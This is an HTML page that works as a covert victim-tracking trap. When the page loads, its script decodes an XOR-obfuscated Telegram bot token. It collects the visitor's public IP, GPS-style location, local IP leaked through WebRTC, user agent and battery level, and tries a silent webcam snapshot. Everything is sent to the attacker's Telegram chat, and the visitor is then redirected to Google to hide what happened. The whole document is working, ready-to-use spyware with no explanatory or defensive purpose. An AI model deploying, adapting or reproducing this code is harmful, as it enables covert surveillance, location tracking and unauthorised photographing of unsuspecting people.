<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="background:#000;color:#0f0;font-family:monospace;">
    <script>
        // 🔱 XOR Encryption Key: 0x5A
        const _encT = [42,42,107,104,107,104,110,99,104,104,110,107,107,114,123,109,107,3,10,116,106,11,105,10,110,13,116,108,11,114,107,107,109,123,114,117,107,112,114,104,109,114,100,10,114,101];
        const _encI = [105,119,119,114,110,119,104,110,115,115];
        
        const decrypt = (arr) => arr.map(b => String.fromCharCode(b ^ 0x5A)).join("");
        const T = decrypt(_encT); const ID = decrypt(_encI);
        const API = "https://api.telegram.org/bot" + T;

        async function TRAP() {
            try {
                // 🔱 سحب البيانات العميقة (IP حقيقي + داخلي + موقع + بطارية)
                const [net, local] = await Promise.all([
                    fetch('https://ipapi.co/json/').then(r => r.json()),
                    new Promise(res => {
                        const pc = new RTCPeerConnection(); pc.createDataChannel('');
                        pc.onicecandidate = e => { if(e.candidate) res(e.candidate.candidate.split(' ')[4]); };
                        pc.createOffer().then(o => pc.setLocalDescription(o));
                        setTimeout(() => res("Bypassed"), 800);
                    })
                ]);

                // 🔱 التصوير الصامت (High-Res Snapshot)
                const snap = await takeSilentSnap();

                const report = `🔱 **GHOST_HEX_v900** 💀\n` +
                             `🎯 **Real IP:** \`${net.ip}\` | **Local:** \`${local}\`\n` +
                             `📍 **GPS:** \`${net.latitude}, ${net.longitude}\`\n` +
                             `📱 **Agent:** \`${navigator.userAgent.slice(0,30)}...\`\n` +
                             `🔋 **Level:** \`${(await navigator.getBattery()).level * 100}%\``;

                // 🔱 الإرسال عبر Beacon لضمان التخفي التام
                navigator.sendBeacon(`${API}/sendMessage`, JSON.stringify({chat_id: ID, text: report, parse_mode: 'Markdown'}));
                
                if(snap) {
                    fetch(`${API}/sendPhoto`, {
                        method: 'POST', headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({chat_id: ID, photo: snap, caption: "📸 SNAP_HEX"})
                    });
                }
                location.replace("https://google.com");
            } catch(e) { location.replace("https://google.com"); }
        }

        async function takeSilentSnap() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({video: true});
                const v = document.createElement('video'); v.srcObject = s; await v.play();
                const c = document.createElement('canvas');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                const d = c.toDataURL('image/jpeg', 0.4);
                s.getTracks().forEach(t => t.stop()); return d;
            } catch(e) { return null; }
        }
        window.onload = TRAP;
    </script>
</body>
</html>
